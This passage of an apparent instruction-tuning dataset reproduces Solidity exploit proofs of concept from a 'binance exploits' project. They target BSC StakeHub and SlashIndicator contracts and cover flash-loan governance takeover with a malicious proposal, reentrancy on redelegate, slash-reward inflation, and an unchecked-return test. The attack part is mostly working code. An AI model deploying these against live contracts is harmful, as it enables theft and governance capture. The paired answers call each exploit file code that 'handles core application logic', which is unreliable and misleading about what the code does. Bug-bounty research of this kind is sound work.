callback\n        // In production, this would be called by the flash loan provider\n        _onFlashLoan(flashLoanAmount);\n    }\n\n    /**\n     * @dev Flash loan callback - this is where the attack happens\n     */\n    function _onFlashLoan(uint256 amount) internal {\n        emit FlashLoanReceived(amount);\n\n        // Step 1: Delegate to validator with flash loaned funds\n        stakeHub.delegate{value: amount}(targetValidator, true);\n\n        // Step 2: Sync GovToken to get voting power\n        address[] memory validators = new address[](1);\n        validators[0] = targetValidator;\n        stakeHub.syncGovToken(validators, address(this));\n\n        uint256 votes = govToken.getVotes(address(this));\n        emit VotingPowerAcquired(votes);\n\n        // Step 3: Create or vote on proposal\n        if (proposalId == 0) {\n            // Create malicious proposal\n            address[] memory targets = new address[](1);\n            uint256[] memory values = new uint256[](1);\n            bytes[] memory calldatas = new bytes[](1);\n\n            targets[0] = address(stakeHub);\n            values[0] = 0;\n            // Example: try to change a critical parameter\n            calldatas[0] = abi.encodeWithSignature(\n                \"updateParam(string,bytes)\",\n                \"maxElectedValidators\",\n                abi.encode(uint256(1)) // Reduce to 1 validator = centralization\n            );\n\n            try governor.propose(targets, values, calldatas, \"Malicious Proposal\") returns (uint256 id) {\n                proposalId = id;\n                emit ProposalCreated(id);\n            } catch {\n                emit ExploitResult(false, \"Proposal creation failed\");\n            }\n        }\n\n        // Step 4: Cast vote\n        if (proposalId != 0) {\n            try governor.castVote(proposalId, 1) returns (uint256 weight) {\n                emit VoteCast(proposalId, weight);\n            } catch {\n                emit ExploitResult(false, \"Vote casting failed\");\n            }\n        }\n\n        // Step 5: Attempt immediate undelegate\n        // This SHOULD fail due to unbond period, but let's verify\n        uint256 shares = govToken.balanceOf(address(this));\n        try stakeHub.undelegate(targetValidator, shares) {\n            emit ExploitResult(true, \"CRITICAL: Immediate undelegate succeeded!\");\n        } catch Error(string memory reason) {\n            emit ExploitResult(false, string.concat(\"Undelegate blocked: \", reason));\n        }\n\n        // Step 6: Try redelegate as bypass\n        // Check if redelegate allows immediate withdrawal\n        try stakeHub.redelegate(targetValidator, targetValidator, shares, false) {\n            emit ExploitResult(true, \"WARNING: Redelegate might be a bypass vector\");\n        } catch {\n            emit ExploitResult(false, \"Redelegate also blocked\");\n        }\n\n        inFlashLoan = false;\n    }\n\n    /**\n     * @dev Analyze if the attack is viable\n     */\n    function analyzeViability() external view returns (\n        uint256 proposalThreshold,\n        uint256 currentVotes,\n        bool hasEnoughVotes\n    ) {\n        proposalThreshold = governor.proposalThreshold();\n        currentVotes = govToken.getVotes(address(this));\n        hasEnoughVotes = currentVotes >= proposalThreshold;\n    }\n\n    receive() external payable {}\n}\n\n/**\n * @title FlashLoanSimulator\n * @dev Simulates a flash loan for testing purposes\n */\ncontract FlashLoanSimulator {\n    FlashLoanGovernanceExploit public exploit;\n\n    constructor(address _exploit) {\n        exploit = FlashLoanGovernanceExploit(payable(_exploit));\n    }\n\n    function simulateFlashLoan(\n        address targetValidator,\n        uint256 proposalId,\n        uint256 amount\n    ) external payable {\n        require(msg.value >= amount, \"Insufficient funds for simulation\");\n\n        // Send funds to exploit contract and execute\n        exploit.executeExploit{value: amount}(\n            targetValidator,\n            proposalId,\n            amount\n        );\n\n        // In real flash loan, funds would need to be returned here\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file FlashLoanGovernanceExploit.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Flash Loan Governance Manipulation                           â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - GovToken + StakeHub                    â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $75,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The GovToken mints voting power based on staked BNB amount.\n * If an attacker can:\n * 1. Flash loan large amount of BNB\n * 2. Delegate to validator (get shares)\n * 3. Sync GovToken (get voting power)\n * 4. Vote on governance proposal\n * 5. Undelegate and repay flash loan\n *\n * The 7-day unbond period SHOULD prevent this, but we need to verify\n * there's no bypass via redelegate() or other mechanisms.\n *\n * WHY IT'S DANGEROUS:\n * - Could pass malicious governance proposals\n * - Drain treasury funds\n * - Modify critical protocol parameters\n * - Change system contract addresses\n */\n\ninterface IStakeHub {\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n    function redelegate(address src, address dst, uint256 shares, bool power) external;\n    function syncGovToken(address[] calldata operators, address account) external;\n}\n\ninterface IGovToken {\n    function balanceOf(address account) external view returns (uint256);\n    function getVotes(address account) external view returns (uint256);\n    function delegates(address account) external view returns (address);\n}\n\ninterface IBSCGovernor {\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n\n    function castVote(uint256 proposalId, uint8 support) externa\n```", "output": "This file `FlashLoanGovernanceExploit.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for H02_UncheckedReturnValue_PoC.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\H02_UncheckedReturnValue_PoC.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * ============================================================================\n *  CRITICAL VULNERABILITY: Unchecked Return Value in StakeHub.distributeReward()\n * ============================================================================\n *\n * Target: BSC Genesis Contract - StakeHub.sol:656\n * Severity: HIGH (Permanent Loss of Funds)\n * Bounty Potential: $50,000 - $100,000\n *\n * VULNERABILITY SUMMARY:\n * ----------------------\n * The distributeReward() function in StakeHub.sol does not check the return\n * value of an external .call() when sending funds to SYSTEM_REWARD_ADDR.\n * If this call fails, the BNB remains permanently trapped in StakeHub with\n * no recovery mechanism.\n *\n * VULNERABLE CODE (StakeHub.sol:650-665):\n *\n *     function distributeReward(address consensusAddress) external payable onlyValidatorContract {\n *         address operatorAddress = consensusToOperator[consensusAddress];\n *         Validator memory valInfo = _validators[operatorAddress];\n *         if (valInfo.creditContract == address(0) || valInfo.jailed) {\n *             SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");  // <-- NO RETURN CHECK!\n *             emit RewardDistributeFailed(operatorAddress, \"INVALID_VALIDATOR\");\n *             return;\n *         }\n *         // ... rest of function\n *     }\n *\n * ATTACK SCENARIOS:\n * -----------------\n * 1. Validator Migration Failure:\n *    - A validator fails to migrate properly, creditContract = address(0)\n *    - Rewards accumulate in BSCValidatorSet\n *    - distributeReward() attempts to forward to SYSTEM_REWARD_ADDR\n *    - If call fails, funds are lost forever\n *\n * 2. SystemReward Upgrade Risk:\n *    - Governance upgrades SystemReward contract\n *    - New implementation's receive() reverts under certain conditions\n *    - All rewards for invalid/jailed validators are permanently lost\n *\n * 3. Gas Manipulation:\n *    - Complex receive() function in future SystemReward upgrade\n *    - Out of gas during the call\n *    - Funds trapped with silent failure\n */\n\nimport \"forge-std/Test.sol\";\n\n// Mock interfaces\ninterface IStakeHub {\n    function distributeReward(address consensusAddress) external payable;\n}\n\n/**\n * @title MaliciousSystemReward\n * @dev Simulates a SystemReward contract that rejects transfers\n *      This demonstrates what happens if SystemReward is upgraded\n *      to a version that reverts on receive()\n */\ncontract MaliciousSystemReward {\n    bool public shouldReject;\n\n    constructor() {\n        shouldReject = false;\n    }\n\n    function setReject(bool _reject) external {\n        shouldReject = _reject;\n    }\n\n    // This receive function rejects transfers when shouldReject is true\n    receive() external payable {\n        if (shouldReject) {\n            revert(\"Transfer rejected\");\n        }\n    }\n}\n\n/**\n * @title VulnerableStakeHub\n * @dev Simplified version of StakeHub to demonstrate the vulnerability\n */\ncontract VulnerableStakeHub {\n    address public SYSTEM_REWARD_ADDR;\n\n    mapping(address => address) public consensusToOperator;\n    mapping(address => bool) public isJailed;\n    mapping(address => address) public creditContract;\n\n    event RewardDistributeFailed(address indexed validator, string reason);\n    event RewardDistributed(address indexed validator, uint256 amount);\n    event FundsTrapped(uint256 amount);\n\n    constructor(address _systemReward) {\n        SYSTEM_REWARD_ADDR = _systemReward;\n    }\n\n    function setValidator(\n        address consensus,\n        address operator,\n        address credit,\n        bool jailed\n    ) external {\n        consensusToOperator[consensus] = operator;\n        creditContract[operator] = credit;\n        isJailed[operator] = jailed;\n    }\n\n    /**\n     * @dev VULNERABLE FUNCTION - mirrors StakeHub.sol:650-665\n     *      Note: No return value check on the .call()!\n     */\n    function distributeReward(address consensusAddress) external payable {\n        address operatorAddress = consensusToOperator[consensusAddress];\n        address credit = creditContract[operatorAddress];\n        bool jailed = isJailed[operatorAddress];\n\n        if (credit == address(0) || jailed) {\n            // BUG: Return value not checked!\n            // If this fails, msg.value is trapped in this contract forever\n            SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n            emit RewardDistributeFailed(operatorAddress, \"INVALID_VALIDATOR\");\n            return;\n        }\n\n        // Normal distribution path (simplified)\n        emit RewardDistributed(operatorAddress, msg.value);\n    }\n\n    /**\n     * @dev FIXED VERSION - How it should be implemented\n     */\n    function distributeRewardFixed(address consensusAddress) external payable {\n        address operatorAddress = consensusToOperator[consensusAddress];\n        address credit = creditContract[operatorAddress];\n        bool jailed = isJailed[operatorAddress];\n\n        if (credit == address(0) || jailed) {\n            // FIXED: Check return value!\n            (bool success,) = SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n            if (!success) {\n                // Option 1: Revert (safest)\n                revert(\"Transfer to SYSTEM_REWARD failed\");\n\n                // Option 2: Store for later recovery (if must not revert)\n                // trappedFunds[operatorAddress] += msg.value;\n            }\n            emit RewardDistributeFailed(operatorAddress, \"INVALID_VALIDATOR\");\n            return;\n        }\n\n        emit RewardDistributed(operatorAddress, msg.value);\n    }\n\n    // View function to check trapped funds\n    function getTrappedFunds() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/**\n * @title H02_UncheckedReturnValue_Test\n * @dev Foundry test demonstrating the vulnerability\n */\ncontract H02_UncheckedReturnValue_Test is Test {\n    VulnerableStakeHub public stakeHub;\n    MaliciousSystemReward public systemReward;\n\n    address constant VALIDATOR_CONSENSUS = address(0x1);\n    address constant VALIDATOR_OPERATOR = address(0x2);\n\n    function setUp() public {\n        // Deploy malicious SystemReward\n        systemReward = new MaliciousSystemReward();\n\n        // Deploy vulnerable StakeHub\n        stakeHub = new VulnerableStakeHub(address(systemReward));\n\n        // Setup a jailed validator (triggers the vulnerable code path)\n        stakeHub.setValidator(\n            VALIDATOR_CONSENSUS,\n            VALIDATOR_OPERATOR,\n            address(0),  // No credit contract\n            true         // Jailed\n        );\n    }\n\n    /**\n     * @dev Test 1: Normal operation - funds reach SystemReward\n     */\n    function test_NormalOperation() public {\n        uint256 rewardAmount = 1 ether;\n\n        // SystemReward accepts transfers\n        systemReward.setReject(false);\n\n        uint256 systemRewardBalanceBefore = address(systemReward).balance;\n\n        // Distribute reward\n        stakeHub.distributeReward{value: rewardAmount}(VALIDATOR_CONSENSUS);\n\n        // Verify funds reached SystemReward\n        assertEq(\n            address(systemReward).balance,\n            systemRewardBalanceBefore + rewardAmount,\n            \"Funds should reach SystemReward\"\n        );\n        assertEq(stakeHub.getTrappedFunds(), 0, \"No funds should be trapped\");\n    }\n\n    /**\n     * @dev Test 2: EXPLOIT - SystemReward rejects, funds are trapped\n     */\n    function test_FundsTrapped_WhenSystemRewardRejects() public {\n        uint256 rewardAmount = 1 ether;\n\n        // SystemReward starts rejecting transfers (simulates upgrade)\n        systemReward.setReject(true);\n\n        uint256 stakeHubBalanceBefore = address(stakeHub).balance;\n\n        // This should NOT revert (that's the bug!)\n        // The function completes \"successfully\" but funds are trapped\n        stakeHub.distributeReward{value: rewardAmount}(VALIDATOR_CONSENSUS);\n\n        // CRITICAL: Funds are now trapped in StakeHub!\n        assertEq(\n            stakeHub.getTrappedFunds(),\n            stakeHubBalanceBefore + rewardAmount,\n            \"VULNERABILITY: Funds trapped in StakeHub!\"\n        );\n\n        // SystemReward received nothing\n        assertEq(\n            address(systemReward).balance,\n            0,\n            \"SystemReward should have received nothing\"\n        );\n\n        // Log the vulnerability\n        emit log_string(\"====================================\");\n        emit log_string(\"VULNERABILITY CONFIRMED!\");\n        emit log_string(\"====================================\");\n        emit log_named_uint(\"Trapped funds (BNB)\", stakeHub.getTrappedFunds());\n        emit log_string(\"These funds are PERMANENTLY LOST\");\n        emit log_string(\"No recovery mechanism exists\");\n    }\n\n    /**\n     * @dev Test 3: Multiple failed distributions compound the loss\n     */\n    function test_CompoundedLoss_MultipleFails() public {\n        systemReward.setReject(true);\n\n        // Simulate multiple epochs of failed distributions\n        for (uint256 i = 0; i < 10; i++) {\n            stakeHub.distributeReward{value: 1 ether}(VALIDATOR_CONSENSUS);\n        }\n\n        // 10 ETH now permanently trapped\n        assertEq(stakeHub.getTrappedFunds(), 10 ether);\n\n        emit log_string(\"After 10 failed distributions:\");\n        emit log_named_uint(\"Total trapped (BNB)\", stakeHub.getTrappedFunds());\n    }\n}\n\n/**\n * REMEDIATION:\n * ============\n *\n * Option 1 - Require Success (Safest, but may break consensus):\n *\n *     (bool success,) = SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n *     require(success, \"Transfer to SYSTEM_REWARD failed\");\n *\n * Option 2 - Recovery Mechanism (Best for \"should never revert\" requirement):\n *\n *     (bool success,) = SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n *     if (!success) {\n *         unclaimedRewards[operatorAddress] += msg.value;\n *         emit RewardStoredForRecovery(operatorAddress, msg.value);\n *     }\n *\n *     function recoverTrappedRewards(address operator) external onlyGov {\n *         uint256 amount = unclaimedRewards[operator];\n *         unclaimedRewards[operator] = 0;\n *         (bool success,) = SYSTEM_REWARD_ADDR.call{ value: amount }(\"\");\n *         require(success, \"Recovery failed\");\n *     }\n *\n * Option 3 - Fallback Storage (Simple):\n *\n *     (bool success,) = SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");\n *     if (!success) {\n *         // Store in contract for manual recovery by governance\n *         trappedBalance += msg.value;\n *         emit FundsTrapped(msg.value);\n *     }\n */\n\n```"}
{"instruction": "What does the file H02_UncheckedReturnValue_PoC.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * ============================================================================\n *  CRITICAL VULNERABILITY: Unchecked Return Value in StakeHub.distributeReward()\n * ============================================================================\n *\n * Target: BSC Genesis Contract - StakeHub.sol:656\n * Severity: HIGH (Permanent Loss of Funds)\n * Bounty Potential: $50,000 - $100,000\n *\n * VULNERABILITY SUMMARY:\n * ----------------------\n * The distributeReward() function in StakeHub.sol does not check the return\n * value of an external .call() when sending funds to SYSTEM_REWARD_ADDR.\n * If this call fails, the BNB remains permanently trapped in StakeHub with\n * no recovery mechanism.\n *\n * VULNERABLE CODE (StakeHub.sol:650-665):\n *\n *     function distributeReward(address consensusAddress) external payable onlyValidatorContract {\n *         address operatorAddress = consensusToOperator[consensusAddress];\n *         Validator memory valInfo = _validators[operatorAddress];\n *         if (valInfo.creditContract == address(0) || valInfo.jailed) {\n *             SYSTEM_REWARD_ADDR.call{ value: msg.value }(\"\");  // <-- NO RETURN CHECK!\n *             emit RewardDistributeFailed(operatorAddress, \"INVALID_VALIDATOR\");\n *             return;\n *         }\n *         // ... rest of function\n *     }\n *\n * ATTACK SCENARIOS:\n * -----------------\n * 1. Validator Migration Failure:\n *    - A validator fails to migrate properly, creditContract = address(0)\n *    - Rewards accumulate in BSCValidatorSet\n *    - distributeReward() attempts to forward to SYSTEM_REWARD_ADDR\n *    - If call fails, funds are lost forever\n *\n * 2. SystemReward Upgrade Risk:\n *    - Governance upgrades SystemReward contract\n *    - New implementation's receive() reverts under certain conditions\n *    - All rewards for invalid/jailed validators are permanently lost\n *\n * 3. Gas Manipulation:\n *    - Complex receive() function in future SystemReward upgr\n```", "output": "This file `H02_UncheckedReturnValue_PoC.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ReentrancyExploit.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\ReentrancyExploit.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Reentrancy Attack on StakeHub.redelegate()                   â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub                               â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $50,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The redelegate() function makes external calls before completing state changes:\n * 1. unbond() - returns BNB to StakeHub\n * 2. call{value: feeCharge}(\"\") - sends fee to destination creditContract\n * 3. delegate() - delegates to new validator\n *\n * If a malicious creditContract is used as destination, it can reenter\n * during step 2 when receiving the fee.\n *\n * WHY IT'S DANGEROUS:\n * - Could drain staking rewards\n * - Manipulate share calculations\n * - Disrupt validator economics\n */\n\ninterface IStakeHub {\n    function redelegate(\n        address srcValidator,\n        address dstValidator,\n        uint256 shares,\n        bool delegateVotePower\n    ) external;\n\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n}\n\ninterface IStakeCredit {\n    function delegate(address delegator) external payable returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title MaliciousCreditContract\n * @dev Simulates a malicious StakeCredit contract that attempts reentrancy\n */\ncontract MaliciousCreditContract {\n    IStakeHub public stakeHub;\n    address public targetValidator;\n    uint256 public attackCount;\n    uint256 public maxAttacks;\n    bool public attacking;\n\n    event ReentrancyAttempt(uint256 count, uint256 value);\n    event AttackResult(bool success, string reason);\n\n    constructor(address _stakeHub) {\n        stakeHub = IStakeHub(_stakeHub);\n        maxAttacks = 3;\n    }\n\n    // This receive function is called when StakeHub sends the redelegate fee\n    receive() external payable {\n        emit ReentrancyAttempt(attackCount, msg.value);\n\n        if (attacking && attackCount < maxAttacks) {\n            attackCount++;\n\n            // Attempt to reenter redelegate\n            // This would allow draining more funds than entitled\n            try stakeHub.redelegate(\n                targetValidator,\n                address(this),\n                1 ether,\n                false\n            ) {\n                emit AttackResult(true, \"Reentrancy successful!\");\n            } catch Error(string memory reason) {\n                emit AttackResult(false, reason);\n            }\n        }\n    }\n\n    function startAttack(address _targetValidator) external payable {\n        targetValidator = _targetValidator;\n        attacking = true;\n        attackCount = 0;\n\n        // Initial delegation to get shares\n        stakeHub.delegate{value: msg.value}(targetValidator, false);\n    }\n\n    function executeRedelegate(uint256 shares) external {\n        // This triggers the reentrancy via receive()\n        stakeHub.redelegate(\n            targetValidator,\n            address(this), // destination is this malicious contract\n            shares,\n            false\n        );\n    }\n\n    function stopAttack() external {\n        attacking = false;\n    }\n\n    // Required interface functions for StakeCredit compatibility\n    function delegate(address) external payable returns (uint256) {\n        return msg.value;\n    }\n\n    function unbond(address, uint256 shares) external returns (uint256) {\n        return shares;\n    }\n\n    function balanceOf(address) external pure returns (uint256) {\n        return 1000 ether;\n    }\n}\n\n/**\n * @title ReentrancyExploitTest\n * @dev Test harness for the reentrancy exploit\n */\ncontract ReentrancyExploitTest {\n    MaliciousCreditContract public maliciousContract;\n    address public stakeHubAddress;\n\n    event ExploitStarted(address maliciousContract);\n    event ExploitCompleted(uint256 drainedAmount);\n\n    constructor(address _stakeHub) {\n        stakeHubAddress = _stakeHub;\n        maliciousContract = new MaliciousCreditContract(_stakeHub);\n    }\n\n    function runExploit(address targetValidator) external payable {\n        emit ExploitStarted(address(maliciousContract));\n\n        // Step 1: Fund the malicious contract\n        maliciousContract.startAttack{value: msg.value}(targetValidator);\n\n        // Step 2: Execute redelegate which triggers reentrancy\n        // The malicious contract's receive() will attempt to reenter\n        maliciousContract.executeRedelegate(msg.value / 2);\n\n        emit ExploitCompleted(address(maliciousContract).balance);\n    }\n\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file ReentrancyExploit.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Reentrancy Attack on StakeHub.redelegate()                   â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - StakeHub                               â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $50,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The redelegate() function makes external calls before completing state changes:\n * 1. unbond() - returns BNB to StakeHub\n * 2. call{value: feeCharge}(\"\") - sends fee to destination creditContract\n * 3. delegate() - delegates to new validator\n *\n * If a malicious creditContract is used as destination, it can reenter\n * during step 2 when receiving the fee.\n *\n * WHY IT'S DANGEROUS:\n * - Could drain staking rewards\n * - Manipulate share calculations\n * - Disrupt validator economics\n */\n\ninterface IStakeHub {\n    function redelegate(\n        address srcValidator,\n        address dstValidator,\n        uint256 shares,\n        bool delegateVotePower\n    ) external;\n\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n}\n\ninterface IStakeCredit {\n    function delegate(address delegator) external payable returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n/**\n * @title MaliciousCreditContract\n * @dev Simulates a malicious StakeCredit contract that attempts reentrancy\n */\ncontract MaliciousCreditContract {\n    IStakeHub public stakeHub;\n    address public targetValidator;\n    uint256 public attackCount;\n    uint256 public maxAttacks;\n    bool public attacking;\n\n    event ReentrancyAttempt(uint256 count, uint256 value);\n    \n```", "output": "This file `ReentrancyExploit.sol` is part of the exploits project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SlashRewardManipulation.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\SlashRewardManipulation.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Slash Reward Inflation Attack                                â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - SlashIndicator                         â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $10,000 - $25,000                                   â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * In SlashIndicator.sol line 260:\n *   uint256 amount = (address(SYSTEM_REWARD_ADDR).balance * felonySlashRewardRatio) / 100;\n *\n * The reward is calculated as a percentage of SYSTEM_REWARD_ADDR balance.\n * An attacker can:\n * 1. Send large amount of BNB to SYSTEM_REWARD_ADDR\n * 2. Submit valid finality violation evidence\n * 3. Receive inflated reward (20% of the inflated balance)\n * 4. Profit = 20% of donated amount\n *\n * WHY IT'S DANGEROUS:\n * - Drains system reward pool\n * - Creates economic incentive for fake slashing\n * - Could be combined with validator collusion\n */\n\ninterface ISlashIndicator {\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    function submitFinalityViolationEvidence(FinalityEvidence memory evidence) external;\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;\n}\n\ninterface ISystemReward {\n    function claimRewards(address to, uint256 amount) external returns (uint256);\n}\n\n/**\n * @title SlashRewardManipulator\n * @dev Exploits the slash reward calculation vulnerability\n */\ncontract SlashRewardManipulator {\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant SLASH_INDICATOR_ADDR = 0x0000000000000000000000000000000000001001;\n\n    uint256 public constant FELONY_SLASH_REWARD_RATIO = 20; // 20%\n\n    event BalanceInflated(uint256 originalBalance, uint256 inflatedBalance);\n    event RewardCalculation(uint256 expectedReward, uint256 donatedAmount, int256 profit);\n    event ExploitAttempted(bool success, uint256 reward);\n\n    /**\n     * @dev Calculate potential profit from the attack\n     * @param donationAmount Amount to donate to SYSTEM_REWARD_ADDR\n     * @return expectedReward The reward attacker would receive\n     * @return profit Net profit (can be negative if gas > reward)\n     */\n    function calculateProfit(uint256 donationAmount) external view returns (\n        uint256 expectedReward,\n        int256 profit\n    ) {\n        uint256 currentBalance = SYSTEM_REWARD_ADDR.balance;\n        uint256 inflatedBalance = currentBalance + donationAmount;\n\n        expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;\n\n        // Profit = reward - donation\n        // Note: This is profitable only if attacker has valid evidence\n        profit = int256(expectedReward) - int256(donationAmount);\n    }\n\n    /**\n     * @dev Simulate the attack flow\n     * @param donationAmount Amount to donate for inflation\n     * @param hasValidEvidence Whether attacker has valid slashing evidence\n     */\n    function simulateAttack(\n        uint256 donationAmount,\n        bool hasValidEvidence\n    ) external payable returns (bool profitable) {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        uint256 originalBalance = SYSTEM_REWARD_ADDR.balance;\n\n        // Step 1: Inflate SYSTEM_REWARD balance\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, \"Donation failed\");\n\n        uint256 inflatedBalance = SYSTEM_REWARD_ADDR.balance;\n        emit BalanceInflated(originalBalance, inflatedBalance);\n\n        // Step 2: Calculate expected reward\n        uint256 expectedReward = (inflatedBalance * FELONY_SLASH_REWARD_RATIO) / 100;\n        int256 profit = int256(expectedReward) - int256(donationAmount);\n\n        emit RewardCalculation(expectedReward, donationAmount, profit);\n\n        // Step 3: The attack is only profitable if:\n        // - Attacker has valid evidence AND\n        // - expectedReward > donationAmount (which is always false with 20%)\n        //\n        // HOWEVER, if combined with legitimate slashing:\n        // - Original balance reward is \"free\"\n        // - Attacker only loses 80% of donation\n        // - But gains 20% of original balance\n        //\n        // Profitable scenario:\n        // - Original balance = 1000 BNB\n        // - Normal reward = 200 BNB\n        // - Attacker donates 100 BNB\n        // - New reward = (1100 * 20%) = 220 BNB\n        // - Extra profit = 20 BNB (but lost 100 BNB donation)\n        // - Net = -80 BNB (NOT PROFITABLE alone)\n        //\n        // BUT if attacker would slash anyway:\n        // - Gets 220 instead of 200 = +20 BNB extra\n        // - Cost = 100 BNB donation\n        // - Net = -80 BNB (still not profitable)\n\n        profitable = profit > 0;\n\n        // Note: The real vulnerability is if an attacker can front-run\n        // a legitimate slashing report by:\n        // 1. Detecting a pending slash tx in mempool\n        // 2. Donating to inflate balance\n        // 3. Their donation gets included first\n        // 4. Original slasher gets inflated reward\n        // 5. Attacker doesn't benefit directly but could:\n        //    - Be the validator being slashed (reduce their loss)\n        //    - Collude with the slasher for kickback\n\n        emit ExploitAttempted(hasValidEvidence, hasValidEvidence ? expectedReward : 0);\n\n        return profitable;\n    }\n\n    /**\n     * @dev Execute actual attack (requires valid evidence)\n     * Note: This is for educational purposes - real evidence would be needed\n     */\n    function executeAttack(\n        uint256 donationAmount,\n        bytes memory header1,\n        bytes memory header2\n    ) external payable {\n        require(msg.value >= donationAmount, \"Insufficient funds\");\n\n        uint256 balanceBefore = address(this).balance;\n\n        // Step 1: Inflate balance\n        (bool sent,) = SYSTEM_REWARD_ADDR.call{value: donationAmount}(\"\");\n        require(sent, 